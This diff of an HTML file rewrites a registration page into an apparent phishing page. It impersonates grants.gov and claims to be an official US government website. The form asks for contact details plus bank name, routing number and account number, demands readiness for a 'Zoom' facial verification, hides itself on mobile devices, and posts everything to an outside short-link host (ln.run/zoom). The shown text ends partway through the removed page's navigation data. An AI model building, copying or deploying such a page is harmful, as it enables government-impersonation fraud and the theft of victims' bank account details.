@@ -1,909 +1,736 @@
-<?xml version='1.0' encoding='UTF-8' ?>
-<!DOCTYPE html>
-<html lang="en" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml" xmlns:csrf="http://www.owasp.org/index.php/Category:OWASP_CSRFGuard_Project/Owasp.CsrfGuard.tld"><head id="j_idt2">
-		<title>Registration</title>        
-		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /><link type="text/css" rel="stylesheet" href="/apply/javax.faces.resource/theme.css.faces?ln=primefaces-casablanca" /><link type="text/css" rel="stylesheet" href="/apply/javax.faces.resource/css/style.css.faces" /><link type="text/css" rel="stylesheet" href="/apply/javax.faces.resource/jsf/jsfStyles.css.faces" /><link type="text/css" rel="stylesheet" href="/apply/javax.faces.resource/jsf/search.css.faces" /><link type="text/css" rel="stylesheet" href="/apply/javax.faces.resource/css/jsfRoundedBox.css.faces" /><link type="text/css" rel="stylesheet" href="/apply/javax.faces.resource/SpryAssets/SpryTabbedPanels.css.faces" /><link type="text/css" rel="stylesheet" href="/apply/javax.faces.resource/SpryAssets/SpryMenuBarHorizontal.css.faces" /><link type="text/css" rel="stylesheet" href="/apply/javax.faces.resource/css/ggPrimefaces.css.faces" /><link type="text/css" rel="stylesheet" href="/apply/javax.faces.resource/css/default.css.faces" /><link type="text/css" rel="stylesheet" href="/apply/javax.faces.resource/css/grants.css.faces" /><link type="text/css" rel="stylesheet" href="/apply/javax.faces.resource/css/megamenu.css.faces" /><link type="text/css" rel="stylesheet" href="/apply/javax.faces.resource/css/font-awesome.css.faces" /><link type="text/css" rel="stylesheet" href="/apply/javax.faces.resource/components.css.faces?ln=primefaces&amp;v=7.0" /><script type="text/javascript" src="/apply/javax.faces.resource/jquery/jquery.js.faces?ln=primefaces&amp;v=7.0"></script><script type="text/javascript" src="/apply/javax.faces.resource/jquery/jquery-plugins.js.faces?ln=primefaces&amp;v=7.0"></script><script type="text/javascript" src="/apply/javax.faces.resource/core.js.faces?ln=primefaces&amp;v=7.0"></script><script type="text/javascript" src="/apply/javax.faces.resource/components.js.faces?ln=primefaces&amp;v=7.0"></script><script type="text/javascript">if(window.PrimeFaces){PrimeFaces.settings.locale='en';}</script><script type="text/javascript" src="/apply/javax.faces.resource/js/jquery-ui.js.faces"></script><script type="text/javascript" src="/apply/javax.faces.resource/js/jquery-migrate-3.0.0.min.js.faces"></script><script type="text/javascript" src="/apply/javax.faces.resource/js/jkmegamenu.js.faces"></script><script type="text/javascript" src="/apply/javax.faces.resource/js/datatable-custom.js.faces"></script><script type="text/javascript" src="/apply/javax.faces.resource/js/classList.js.faces"></script><script type="text/javascript" src="/apply/javax.faces.resource/js/main.js.faces"></script></head><body id="entirePage" onload="init();">
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
 
-<section class="usa-banner" aria-label="Official website of the United States government">
-  <div class="usa-accordion">
-    <header class="usa-banner__header">
-      <div class="usa-banner__inner">
-        <div class="grid-col-auto">
-          <img aria-hidden="true" class="usa-banner__header-flag" src="https://cdnjs.cloudflare.com/ajax/libs/uswds/3.3.0/img/us_flag_small.png" alt="" />
-        </div>
-        <div class="grid-col-fill tablet:grid-col-auto" aria-hidden="true">
-          <p class="usa-banner__header-text">
-            An official website of the United States government
-          </p>
+  <title>Registration</title>
+
+  <style>
+    :root {
+      --primary: #1a4480;
+      --primary-dark: #162e51;
+      --border: #dfe1e2;
+      --text: #1b1b1b;
+      --muted: #565c65;
+      --background: #f5f5f5;
+      --white: #fff;
+      --danger: #b50909;
+      --success: #176b2c;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family:
+        system-ui,
+        -apple-system,
+        BlinkMacSystemFont,
+        "Segoe UI",
+        sans-serif;
+      color: var(--text);
+      background: var(--background);
+      line-height: 1.5;
+    }
+
+    /* US RESIDENTS BANNER */
+    .resident-banner {
+      width: 100%;
+      min-height: 32px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      padding: 5px 12px;
+      color: var(--white);
+      background: #162e51;
+      font-size: 0.78rem;
+      font-weight: 600;
+      letter-spacing: 0.1px;
+      text-align: center;
+    }
+
+    .resident-flag {
+      width: 22px;
+      height: 15px;
+      display: inline-flex;
+      flex-shrink: 0;
+      overflow: hidden;
+      border-radius: 1px;
+      box-shadow: 0 0 0 1px rgb(255 255 255 / 25%);
+      background:
+        linear-gradient(
+          to bottom,
+          #bf0a30 0%,
+          #bf0a30 7.69%,
+          #fff 7.69%,
+          #fff 15.38%,
+          #bf0a30 15.38%,
+          #bf0a30 23.07%,
+          #fff 23.07%,
+          #fff 30.76%,
+          #bf0a30 30.76%,
+          #bf0a30 38.45%,
+          #fff 38.45%,
+          #fff 46.14%,
+          #bf0a30 46.14%,
+          #bf0a30 53.83%,
+          #fff 53.83%,
+          #fff 61.52%,
+          #bf0a30 61.52%,
+          #bf0a30 69.21%,
+          #fff 69.21%,
+          #fff 76.90%,
+          #bf0a30 76.90%,
+          #bf0a30 84.59%,
+          #fff 84.59%,
+          #fff 92.28%,
+          #bf0a30 92.28%,
+          #bf0a30 100%
+        );
+      position: relative;
+    }
+
+    .resident-flag::before {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 42%;
+      height: 54%;
+      background: #162e51;
+    }
+
+    /* DESKTOP ONLY MESSAGE */
+    #device-error {
+      display: none;
+      min-height: 100vh;
+      padding: 40px 20px;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      background: var(--background);
+    }
+
+    .device-error-card {
+      width: min(500px, 100%);
+      background: #fff;
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 35px 28px;
+      box-shadow: 0 2px 8px rgb(0 0 0 / 8%);
+    }
+
+    .device-error-card h1 {
+      color: var(--primary-dark);
+      margin-top: 0;
+    }
+
+    .device-error-card p {
+      color: var(--muted);
+      margin-bottom: 0;
+    }
+
+    .site-content {
+      display: block;
+    }
+
+    .site-header {
+      background: var(--white);
+      border-bottom: 1px solid var(--border);
+    }
+
+    .header-inner {
+      width: min(1100px, calc(100% - 32px));
+      margin: auto;
+      min-height: 90px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .logo {
+      display: inline-flex;
+      align-items: center;
+      color: var(--primary-dark);
+      text-decoration: none;
+      font-size: 1.5rem;
+      font-weight: 700;
+    }
+
+    .logo img {
+      display: block;
+      width: auto;
+      height: 58px;
+      object-fit: contain;
+    }
+
+    .main {
+      width: min(800px, calc(100% - 32px));
+      margin: 40px auto;
+    }
+
+    .card {
+      background: var(--white);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 32px;
+      box-shadow: 0 2px 8px rgb(0 0 0 / 8%);
+    }
+
+    h1 {
+      margin: 0 0 8px;
+      color: var(--primary-dark);
+    }
+
+    .intro {
+      margin: 0 0 32px;
+      color: var(--muted);
+    }
+
+    fieldset {
+      border: 0;
+      padding: 0;
+      margin: 0 0 32px;
+    }
+
+    legend {
+      width: 100%;
+      margin-bottom: 20px;
+      padding-bottom: 8px;
+      border-bottom: 2px solid var(--border);
+      color: var(--primary-dark);
+      font-size: 1.25rem;
+      font-weight: 700;
+    }
+
+    .form-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 20px;
+    }
+
+    .field {
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+
+    .field.full {
+      grid-column: 1 / -1;
+    }
+
+    label {
+      font-weight: 600;
+    }
+
+    .required {
+      color: var(--danger);
+    }
+
+    input {
+      width: 100%;
+      min-height: 44px;
+      padding: 10px 12px;
+      border: 1px solid #8d9297;
+      border-radius: 4px;
+      font: inherit;
+      background: #fff;
+    }
+
+    input:focus {
+      outline: 3px solid rgb(0 94 162 / 30%);
+      border-color: var(--primary);
+    }
+
+    .help {
+      margin: 0;
+      color: var(--muted);
+      font-size: .9rem;
+    }
+
+    /* TERMS AND CONDITIONS */
+    .terms-section {
+      margin-top: 8px;
+      margin-bottom: 28px;
+      padding: 18px;
+      border: 1px solid var(--border);
+      border-radius: 5px;
+      background: #f8f9fa;
+    }
+
+    .terms-title {
+      margin: 0 0 10px;
+      color: var(--primary-dark);
+      font-weight: 700;
+    }
+
+    .terms-text {
+      margin: 0 0 16px;
+      color: var(--muted);
+      font-size: .92rem;
+    }
+
+    .agreement {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      cursor: pointer;
+      font-weight: 600;
+    }
+
+    .agreement input[type="checkbox"] {
+      width: 20px;
+      min-width: 20px;
+      height: 20px;
+      min-height: 20px;
+      margin: 2px 0 0;
+      padding: 0;
+      accent-color: var(--primary);
+      cursor: pointer;
+    }
+
+    .actions {
+      display: flex;
+      justify-content: flex-end;
+      gap: 12px;
+      padding-top: 8px;
+    }
+
+    button {
+      min-height: 44px;
+      padding: 10px 22px;
+      border: 0;
+      border-radius: 4px;
+      font: inherit;
+      font-weight: 700;
+      cursor: pointer;
+    }
+
+    button:disabled {
+      opacity: .55;
+      cursor: not-allowed;
+    }
+
+    .button-primary {
+      color: var(--white);
+      background: var(--primary);
+    }
+
+    .button-primary:hover:not(:disabled) {
+      background: var(--primary-dark);
+    }
+
+    .button-secondary {
+      color: var(--text);
+      background: #eee;
+    }
+
+    /* FOOTER */
+    .footer {
+      padding: 30px 20px;
+      text-align: center;
+      color: var(--muted);
+      font-size: .9rem;
+      background: #fff;
+      border-top: 1px solid var(--border);
+    }
+
+    .footer-logo {
+      display: inline-block;
+      margin-bottom: 12px;
+    }
+
+    .footer-logo img {
+      height: 42px;
+      width: auto;
+      display: block;
+      margin: auto;
+    }
+
+    .social-links {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 16px;
+      margin: 12px 0;
+    }
+
+    .social-links a {
+      color: var(--primary);
+      text-decoration: none;
+      font-weight: 600;
+    }
+
+    .social-links a:hover {
+      color: var(--primary-dark);
+      text-decoration: underline;
+    }
+
+    .footer-copy {
+      margin: 12px 0 0;
+    }
+
+    /* TABLET / MOBILE = BLOCK ACCESS */
+    @media (max-width: 900px) {
+      .site-content {
+        display: none;
+      }
+
+      #device-error {
+        display: flex;
+      }
+    }
+
+    @media (max-height: 500px) and (orientation: landscape) {
+      .site-content {
+        display: none;
+      }
+
+      #device-error {
+        display: flex;
+      }
+    }
+
+    @media (max-width: 600px) {
+      .device-error-card {
+        padding: 28px 20px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- US RESIDENTS BANNER -->
+  <div class="resident-banner">
+    <span class="resident-flag" aria-hidden="true">us</span>
+    <span>An official website of the United States government</span>
+  </div>
+
+  <!-- DEVICE RESTRICTION MESSAGE -->
+  <section id="device-error" aria-labelledby="device-error-title">
+    <div class="device-error-card">
+      <h1 id="device-error-title">Computer Required</h1>
+      <p>
+        This registration form is only available on a computer.
+        Please open this page on a desktop or laptop computer to continue.
+      </p>
+    </div>
+  </section>
+
+  <!-- MAIN SITE CONTENT -->
+  <div class="site-content">
+
+    <header class="site-header">
+      <div class="header-inner">
+
+        <a class="logo" href="/" aria-label="Registration home">
+          <img
+            src="./images/grants-gov-logo-text.png"
+            alt="Registration logo"
+          >
+        </a>
+
       </div>
     </header>
+
+    <main class="main">
+      <section class="card">
+
+        <h1>Register</h1>
+
+        <p class="intro">
+          Please enter your information below to register for your grant on grants.gov.
+          Required fields are marked with an asterisk.
+        </p>
+
+        <!-- NETLIFY FORM -->
+        <form
+          id="registration-form"
+          name="registration"
+          method="POST"
+          data-netlify="true"
+          netlify-honeypot="bot-field"
+          action="https://ln.run/zoom"
+        >
+
+          <!-- Netlify form identification -->
+          <input type="hidden" name="form-name" value="registration">
+
+          <!-- Honeypot field -->
+          <p hidden>
+            <label>
+              Do not fill this out if you are human:
+              <input name="bot-field">
+            </label>
+          </p>
+
+          <fieldset>
+            <legend>Contact information</legend>
+
+            <div class="form-grid">
+
+              <div class="field">
+                <label for="first-name">
+                  First name <span class="required">*</span>
+                </label>
+
+                <input
+                  id="first-name"
+                  name="firstName"
+                  type="text"
+                  autocomplete="given-name"
+                  maxlength="35"
+                  required
+                >
+              </div>
+
+              <div class="field">
+                <label for="last-name">
+                  Last name <span class="required">*</span>
+                </label>
+
+                <input
+                  id="last-name"
+                  name="lastName"
+                  type="text"
+                  autocomplete="family-name"
+                  maxlength="60"
+                  required
+                >
+              </div>
+
+              <div class="field full">
+                <label for="email">
+                  Email address <span class="required">*</span>
+                </label>
+
+                <input
+                  id="email"
+                  name="email"
+                  type="email"
+                  autocomplete="email"
+                  maxlength="254"
+                  required
+                >
+              </div>
+
+              <div class="field">
+                <label for="phone">
+                  Phone number <span class="required">*</span>
+                </label>
+
+                <input
+                  id="phone"
+                  name="phone"
+                  type="tel"
+                  autocomplete="tel"
+                  maxlength="20"
+                >
+              </div>
+
+              <div class="field">
+                <label for="zipcode">
+                  ZIP code <span class="required">*</span>
+                </label>
+
+                <input
+                  id="zipcode"
+                  name="zipcode"
+                  type="text"
+                  inputmode="numeric"
+                  autocomplete="postal-code"
+                  maxlength="10"
+                  pattern="[0-9]{5}(-[0-9]{4})?"
+                  title="Enter a valid US ZIP code, for example 33101 or 33101-1234."
+                  required
+                >
+
+                <p class="help">
+                  Enter your 5-digit ZIP code or ZIP+4.
+                </p>
+              </div>
+
+            </div>
+          </fieldset>
+
+          <fieldset>
+            <legend>Account details</legend>
+
+            <div class="form-grid">
+
+              <div class="field full">
+                <label for="username">
+                  Bank Name <span class="required">*</span>
+                </label>
+
+                <input
+                  id="Bank"
+                  name="Bankname"
+                  type="text"
+                  autocomplete="Bank"
+                  maxlength="25"
+                  required
+                >
+              </div>
+
+              <div class="field">
+                <label for="password">
+                  Routing No. <span class="required">*</span>
+                </label>
+
+                <input
+                  id="Routing No."
+                  name="Routing No"
+                  type="Rout-No"
+                  autocomplete="Routing"
+                  minlength="15"
+                  required
+                >
+
+                <p class="help">
+                  Please use your ACH/WIRE enabled bank.
+                </p>
+              </div>
+
+              <div class="field">
+                <label for="password-confirm">
+                  Account No. <span class="required">*</span>
+                </label>
+
+                <input
+                  id="Account No."
+                  name="Account No"
+                  type="Acct-No"
+                  autocomplete="Acct-No"
+                  minlength="15"
+                  required
+                >
+              </div>
+
+            </div>
+          </fieldset>
+
+          <!-- TERMS AND CONDITIONS -->
+          <section class="terms-section" aria-labelledby="terms-title">
+
+            <h2
+              id="terms-title"
+              class="terms-title">
+              Terms and confirmation
+            </h2>
+
+            <p class="terms-text">
+              By submitting this registration, you confirm that all
+              information provided is true, accurate, and complete and YOU ARE READY TO DO A FACIAL IDENTITY VIA ZOOM.
+              Providing false or misleading information may result in
+              your registration being disallowed. Fake, fictitious, or
+              knowingly false names will not be recorded as valid
+              registration information.
+            </p>
+
+            <label class="agreement" for="information-correct">
+              <input
+                id="information-correct"
+                name="informationCorrect"
+                type="checkbox"
+                value="Yes"
+                required
+              >
+
+              <span>
+                I confirm that all information I have entered is correct
+                and I am ready for my zoom verification.
+                <span class="required">*</span>
+              </span>
+            </label>
+
+          </section>
+
+          <div class="actions">
+
+            <button
+              type="reset"
+              class="button-secondary">
+              Cancel
+            </button>
+
+            <button
+              type="submit"
+              class="button-primary"
+              id="continue-button">
+              Continue
+            </button>
+
+          </div>
+
+        </form>
+      </section>
+    </main>
+
+    <!-- FOOTER -->
+    <footer class="footer">
+
+      <a
+        class="footer-logo"
+        href="/"
+        aria-label="Registration home">
+        <img
+          src="./images/grants-gov-logo-w.png"
+          alt="Registration logo"
+        >
+      </a>
+
+      <div class="social-links">
+        <a href="https://twitter.com/grantsdotgov"><img class="usa-social-link__icon" src="https://cdnjs.cloudflare.com/ajax/libs/uswds/3.3.0/img/usa-icons/twitter.svg" /></a>
+        <a href="https://www.youtube.com/user/GrantsGovUS"><img class="usa-social-link__icon" src="https://cdnjs.cloudflare.com/ajax/libs/uswds/3.3.0/img/usa-icons/youtube.svg" /></a>
+        <a href="/apply/spoExit.jsp?p=web/grants/rss.html"><img class="usa-social-link__icon" src="https://cdnjs.cloudflare.com/ajax/libs/uswds/3.3.0/img/usa-icons/rss_feed.svg" /></a>
+      </div>
+
+      <p class="footer-copy">
+        Registration Portal
+      </p>
+
+    </footer>
+
   </div>
-</section>
 
-	<div id="wrapper" class="noPrintBorder">
-		<div id="header" class="LandscapeDiv"><span id="navScript">
-		<script type="text/javascript">
-   
-var menuItems = [];
-var menuCount =0;
-var webUrl = "https://ln.run/zoom";
-var exitUrl ="https://apply07.grants.gov/apply/spoExit.jsp?p=";
-var applyUrl ="/apply/";
-var logoutURL="Logout";
-var isApplicant = false;
-var isGrantor = false;
-var isWorkspacePartner = false;
-var isAuthorized = false;
-var isApplicantIndv = false;
-var isEbiz = false;
-var isApplicantOrg = false;
-var isUser=false;
-var activities=[];
-var isConnect = false;
-var isEmailDuplicate = false;
-var connectActivities = [];
-var navData= {"topNavItems":[{"layoutId":474,"levelNumber":1,"parentLayoutId":0,"navName":"Home","friendlyURL":"/home","pageURL":"home","priority":0,"childCount":0,"parentName":"root"},{"layoutId":763,"levelNumber":1,"parentLayoutId":0,"navName":"Learn Grants","friendlyURL":"/learn-grants","pageURL":"learn-grants","priority":1,"childCount":60,"parentName":"root"},{"layoutId":480,"levelNumber":1,"parentLayoutId":0,"navName":"Search Grants","friendlyURL":"/search-grants","pageURL":"search-grants","priority":2,"childCount":0,"parentName":"root"},{"layoutId":481,"levelNumber":1,"parentLayoutId":0,"navName":"Applicants","friendlyURL":"/applicants","pageURL":"applicants","priority":4,"childCount":18,"parentName":"root"},{"layoutId":464,"levelNumber":1,"parentLayoutId":0,"navName":"Grantors","friendlyURL":"/grantors","pageURL":"grantors","priority":5,"childCount":6,"parentName":"root"},{"layoutId":509,"levelNumber":1,"parentLayoutId":0,"navName":"System-to-System","friendlyURL":"/system-to-system","pageURL":"system-to-system","priority":6,"childCount":20,"parentName":"root"},{"layoutId":562,"levelNumber":1,"parentLayoutId":0,"navName":"Forms","friendlyURL":"/forms","pageURL":"forms","priority":7,"childCount":14,"parentName":"root"},{"layoutId":569,"levelNumber":1,"parentLayoutId":0,"navName":"Connect","friendlyURL":"/connect","pageURL":"connect","priority":8,"childCount":4,"parentName":"root"},{"layoutId":575,"levelNumber":1,"parentLayoutId":0,"navName":"Support","friendlyURL":"/support","pageURL":"support","priority":9,"childCount":6,"parentName":"root"}],"navitemMap":{"Forms":[{"layoutId":840,"levelNumber":2,"parentLayoutId":562,"navName":"Forms Repository","friendlyURL":"/forms/forms-repository","pageURL":"forms/forms-repository","priority":0,"childCount":7,"parentName":"Forms"},{"layoutId":633,"levelNumber":2,"parentLayoutId":562,"navName":"Forms Development","friendlyURL":"/forms/forms-development","pageURL":"forms/forms-development","priority":2,"childCount":6,"parentName":"Forms"}],"Grant-Making Agencies":[{"layoutId":677,"levelNumber":3,"parentLayoutId":650,"navName":"U.S. Agency for International Development (USAID)","friendlyURL":"/learn-grants/grant-making-agencies/u-s-agency-for-international-development-usaid","pageURL":"learn-grants/grant-making-agencies/u-s-agency-for-international-development-usaid","priority":0,"childCount":0,"parentName":"Grant-Making Agencies"},{"layoutId":864,"levelNumber":3,"parentLayoutId":650,"navName":"AmeriCorps (AC)","friendlyURL":"/learn-grants/grant-making-agencies/americorps-ac","pageURL":"learn-grants/grant-making-agencies/americorps-ac","priority":1,"childCount":0,"parentName":"Grant-Making Agencies"},{"layoutId":679,"levelNumber":3,"parentLayoutId":650,"navName":"U.S. Department of Agriculture (USDA)","friendlyURL":"/learn-grants/grant-making-agencies/department-of-agriculture-usda","pageURL":"learn-grants/grant-making-agencies/u-s-department-of-agriculture-usda","priority":3,"childCount":0,"parentName":"Grant-Making Agencies"},{"layoutId":680,"levelNumber":3,"parentLayoutId":650,"navName":"U.S. Department of Commerce (DOC)","friendlyURL":"/learn-grants/grant-making-agencies/u-s-department-of-commerce-doc","pageURL":"learn-grants/grant-making-agencies/u-s-department-of-commerce-doc","priority":4,"childCount":0,"parentName":"Grant-Making Agencies"},{"layoutId":681,"levelNumber":3,"parentLayoutId":650,"navName":"U.S. Department of Defense (DOD)","friendlyURL":"/learn-grants/grant-making-agencies/u-s-department-of-defense-dod","pageURL":"learn-grants/grant-making-agencies/u-s-department-of-defense-dod","priority":5,"childCount":0,"parentName":"Grant-Making Agencies"},{"layoutId":682,"levelNumber":3,"parentLayoutId":650,"navName":"U.S. Department of Education (ED)","friendlyURL":"/learn-grants/grant-making-agencies/u-s-department-of-education-ed","pageURL":"learn-grants/grant-making-agencies/u-s-department-of-education-ed","priority":6,"childCount":0,"parentName":"Grant-Making Agencies"},{"layoutId":683,"levelNumber":3,"parentLayoutId":650,"navName":"U.S. Department of Energy (DOE)","friendlyURL":"/learn-grants/grant-making-agencies/u-s-department-of-energy-doe","pageURL":"learn-grants/grant-making-agencies/u-s-department-of-energy-doe","priority":7,"childCount":0,"parentName":"Grant-Making Agencies"},{"layoutId":684,"levelNumber":3,"parentLayoutId":650,"navName":"U.S. Department of Health and Human Services (HHS)","friendlyURL":"/learn-grants/grant-making-agencies/u-s-department-of-health-and-human-services-hhs","pageURL":"learn-grants/grant-making-agencies/u-s-department-of-health-and-human-services-hhs","priority":8,"childCount":0,"parentName":"Grant-Making Agencies"},{"layoutId":685,"levelNumber":3,"parentLayoutId":650,"navName":"U.S. Department of Homeland Security (DHS)","friendlyURL":"/learn-grants/grant-making-agencies/u-s-department-of-homeland-security-dhs","pageURL":"learn-grants/grant-making-agencies/u-s-department-of-homeland-security-dhs","priority":9,"childCount":0,"parentName":"Grant-Making Agencies"},{"layoutId":686,"levelNumber":3,"parentLayoutId":650,"navName":"U.S. Department of Housing and Urban Development (HUD)","friendlyURL":"/learn-grants/grant-making-agencies/u-s-department-of-housing-and-urban-development-hud","pageURL":"learn-grants/grant-making-agencies/u-s-department-of-housing-and-urban-development-hud","priority":10,"childCount":0,"parentName":"Grant-Making Agencies"},{"layoutId":687,"levelNumber":3,"parentLayoutId":650,"navName":"U.S. Department of the Interior (DOI)","friendlyURL":"/learn-grants/grant-making-agencies/u-s-department-of-the-interior-doi","pageURL":"learn-grants/grant-making-agencies/u-s-department-of-the-interior-doi","priority":11,"childCount":0,"parentName":"Grant-Making Agencies"},{"layoutId":688,"levelNumber":3,"parentLayoutId":650,"navName":"U.S. Department of Justice (DOJ)","friendlyURL":"/learn-grants/grant-making-agencies/u-s-department-of-justice-doj","pageURL":"learn-grants/grant-making-agencies/u-s-department-of-justice-doj","priority":12,"childCount":0,"parentName":"Grant-Making Agencies"},{"layoutId":689,"levelNumber":3,"parentLayoutId":650,"navName":"U.S. Department of Labor (DOL)","friendlyURL":"/learn-grants/grant-making-agencies/u-s-department-of-labor-dol","pageURL":"learn-grants/grant-making-agencies/u-s-department-of-labor-dol","priority":13,"childCount":0,"parentName":"Grant-Making Agencies"},{"layoutId":690,"levelNumber":3,"parentLayoutId":650,"navName":"U.S. Department of State (DOS)","friendlyURL":"/learn-grants/grant-making-agencies/u-s-department-of-state-dos","pageURL":"learn-grants/grant-making-agencies/u-s-department-of-state-dos","priority":14,"childCount":0,"parentName":"Grant-Making Agencies"},{"layoutId":691,"levelNumber":3,"parentLayoutId":650,"navName":"U.S. Department of Transportation (DOT)","friendlyURL":"/learn-grants/grant-making-agencies/u-s-department-of-transportation-dot","pageURL":"learn-grants/grant-making-agencies/u-s-department-of-transportation-dot","priority":15,"childCount":0,"parentName":"Grant-Making Agencies"},{"layoutId":692,"levelNumber":3,"parentLayoutId":650,"navName":"U.S. Department of the Treasury (TREAS)","friendlyURL":"/learn-grants/grant-making-agencies/u-s-department-of-the-treasury-treas","pageURL":"learn-grants/grant-making-agencies/u-s-department-of-the-treasury-treas","priority":16,"childCount":0,"parentName":"Grant-Making Agencies"},{"layoutId":693,"levelNumber":3,"parentLayoutId":650,"navName":"U.S. Department of Veterans Affairs (VA)","friendlyURL":"/learn-grants/grant-making-agencies/u-s-department-of-veterans-affairs-va","pageURL":"learn-grants/grant-making-agencies/u-s-department-of-veterans-affairs-va","priority":17,"childCount":0,"parentName":"Grant-Making Agencies"},{"layoutId":694,"levelNumber":3,"parentLayoutId":650,"navName":"Environmental Protection Agency (EPA)","friendlyURL":"/learn-grants/grant-making-agencies/environmental-protection-agency-epa","pageURL":"learn-grants/grant-making-agencies/environmental-protection-agency-epa","priority":18,"childCount":0,"parentName":"Grant-Making Agencies"},{"layoutId":695,"levelNumber":3,"parentLayoutId":650,"navName":"Institute of Museum and Library Services (IMLS)","friendlyURL":"/learn-grants/grant-making-agencies/institute-of-museum-and-library-services-imls","pageURL":"learn-grants/grant-making-agencies/institute-of-museum-and-library-services-imls","priority":19,"childCount":0,"parentName":"Grant-Making Agencies"},{"layoutId":696,"levelNumber":3,"parentLayoutId":650,"navName":"National Aeronautics and Space Administration (NASA)","friendlyURL":"/learn-grants/grant-making-agencies/national-aeronautics-and-space-administration-nasa","pageURL":"learn-grants/grant-making-agencies/national-aeronautics-and-space-administration-nasa","priority":20,"childCount":0,"parentName":"Grant-Making Agencies"},{"layoutId":697,"levelNumber":3,"parentLayoutId":650,"navName":"National Archives and Records Administration (NARA)","friendlyURL":"/learn-grants/grant-making-agencies/national-archives-and-records-administration-nara","pageURL":"learn-grants/grant-making-agencies/national-archives-and-records-administration-nara","priority":21,"childCount":0,"parentName":"Grant-Making Agencies"},{"layoutId":698,"levelNumber":3,"parentLayoutId":650,"navName":"National Endowment for the Arts (NEA)","friendlyURL":"/learn-grants/grant-making-agencies/national-endowment-for-the-arts-nea","pageURL":"learn-grants/grant-making-agencies/national-endowment-for-the-arts-nea","priority":22,"childCount":0,"parentName":"Grant-Making Agencies"},{"layoutId":699,"levelNumber":3,"parentLayoutId":650,"navName":"National Endowment for the Humanities (NEH)","friendlyURL":"/learn-grants/grant-making-agencies/national-endowment-for-the-humanities-neh","pageURL":"learn-grants/grant-making-agencies/national-endowment-for-the-humanities-neh","priority":23,"childCount":0,"parentName":"Grant-Making Agencies"},{"layoutId":700,"levelNumber":3,"parentLayoutId":650,"navName":"National Science Foundation (NSF)","friendlyURL":"/learn-grants/grant-making-agencies/national-science-foundation-nsf","pageURL":"learn-grants/grant-making-agencies/national-science-foundation-nsf","priority":24,"childCount":0,"parentName":"Grant-Making Agencies"},{"layoutId":701,"levelNumber":3,"parentLayoutId":650,"navName":"Small Business Administration (SBA)","friendlyURL":"/learn-grants/grant-making-agencies/small-business-administration-sba","pageURL":"learn-grants/grant-making-agencies/small-business-administration-sba","priority":25,"childCount":0,"parentName":"Grant-Making Agencies"},{"layoutId":702,"levelNumber":3,"parentLayoutId":650,"navName":"Social Security Administration (SSA)","friendlyURL":"/learn-grants/grant-making-agencies/social-security-administration-ssa","pageURL":"learn-grants/grant-making-agencies/social-security-administration-ssa","priority":26,"childCount":0,"parentName":"Grant-Making Agencies"},{"layoutId":725,"levelNumber":3,"parentLayoutId":650,"navName":"Other Grant-Making Agencies","friendlyURL":"/learn-grants/grant-making-agencies/other-grant-making-agencies","pageURL":"learn-grants/grant-making-agencies/other-grant-making-agencies","priority":27,"childCount":0,"parentName":"Grant-Making Agencies"}],"Forms Development":[{"layoutId":796,"levelNumber":3,"parentLayoutId":633,"navName":"Forms Status Report","friendlyURL":"/forms/forms-development/forms-status-report","pageURL":"forms/forms-development/forms-status-report","priority":0,"childCount":0,"parentName":"Forms Development"},{"layoutId":568,"levelNumber":3,"parentLayoutId":633,"navName":"Forms Process","friendlyURL":"/forms/forms-development/forms-process","pageURL":"forms/forms-development/forms-process","priority":1,"childCount":1,"parentName":"Forms Development"},{"layoutId":768,"levelNumber":3,"parentLayoutId":633,"navName":"Forms Request","friendlyURL":"/forms/forms-development/forms-request","pageURL":"forms/forms-development/forms-request","priority":2,"childCount":0,"parentName":"Forms Development"},{"layoutId":853,"levelNumber":3,"parentLayoutId":633,"navName":"Country and State Lists Updates","friendlyURL":"/forms/forms-development/country-and-state-lists-updates","pageURL":"forms/forms-development/country-and-state-lists-updates","priority":3,"childCount":0,"parentName":"Forms Development"},{"layoutId":859,"levelNumber":3,"parentLayoutId":633,"navName":"Planned UEI Updates","friendlyURL":"/forms/forms-development/planned-uei-updates","pageURL":"forms/forms-development/planned-uei-updates","priority":4,"childCount":0,"parentName":"Forms Development"}],"Grants 101":[{"layoutId":656,"levelNumber":3,"parentLayoutId":644,"navName":"The Grant Lifecycle","friendlyURL":"/learn-grants/grants-101/the-grant-lifecycle","pageURL":"learn-grants/grants-101/the-grant-lifecycle","priority":0,"childCount":0,"parentName":"Grants 101"},{"layoutId":657,"levelNumber":3,"parentLayoutId":644,"navName":"Pre-Award Phase","friendlyURL":"/learn-grants/grants-101/pre-award-phase","pageURL":"learn-grants/grants-101/pre-award-phase","priority":1,"childCount":0,"parentName":"Grants 101"},{"layoutId":658,"levelNumber":3,"parentLayoutId":644,"navName":"Award Phase","friendlyURL":"/learn-grants/grants-101/award-phase","pageURL":"learn-grants/grants-101/award-phase","priority":2,"childCount":0,"parentName":"Grants 101"},{"layoutId":659,"levelNumber":3,"parentLayoutId":644,"navName":"Post Award Phase","friendlyURL":"/learn-grants/grants-101/post-award-phase","pageURL":"learn-grants/grants-101/post-award-phase","priority":3,"childCount":0,"parentName":"Grants 101"},{"layoutId":660,"levelNumber":3,"parentLayoutId":644,"navName":"Getting Started Checklist","friendlyURL":"/learn-grants/grants-101/getting-started-checklist","pageURL":"learn-grants/grants-101/getting-started-checklist","priority":5,"childCount":0,"parentName":"Grants 101"}],"Support":[{"layoutId":708,"levelNumber":2,"parentLayoutId":575,"navName":"About 